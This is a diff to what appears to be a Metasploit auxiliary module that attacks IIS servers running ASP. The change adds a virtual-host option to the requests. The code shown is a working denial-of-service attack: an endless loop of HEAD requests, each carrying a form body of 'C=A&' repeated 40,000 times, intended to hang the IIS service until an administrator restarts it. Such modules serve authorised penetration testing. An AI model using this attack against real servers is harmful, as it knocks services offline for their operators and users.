@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Auxiliary
 					The vulnerability allows remote unauthenticated attackers to force the IIS server
 				to become unresponsive until the IIS service is restarted manually by the administrator.
 				Required is that Active Server Pages are hosted by the IIS and that an ASP script reads
-				out a Post Form value.  When the following ASP script is hosted by IIS the attacker can run the
+				out a Post Form value.
 			},
 			'Author'         =>
 				[
@@ -44,13 +44,14 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(80),
+				OptString.new('VHOST', [ false, 'The virtual host name to use in requests']),
 				OptString.new('URI', [ true, 'URI to request', '/page.asp' ])
 			], self.class )
 	end
 
 
 	def run
-		print_status("Attacking http://#{rhost}:#{rport}#{datastore['URI']}")
+		print_status("Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{datastore['URI']}")
 
 		begin
 			while(1)
@@ -59,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 					payload = "C=A&" * 40000
 					length = payload.size
 					sploit = "HEAD #{datastore['URI']} HTTP/1.1\r\n"
-					sploit << "Host: #{rhost}\r\n"
+					sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
 					sploit << "Connection:Close\r\n"
 					sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
 					sploit << "Content-Length:#{length} \r\n\r\n"
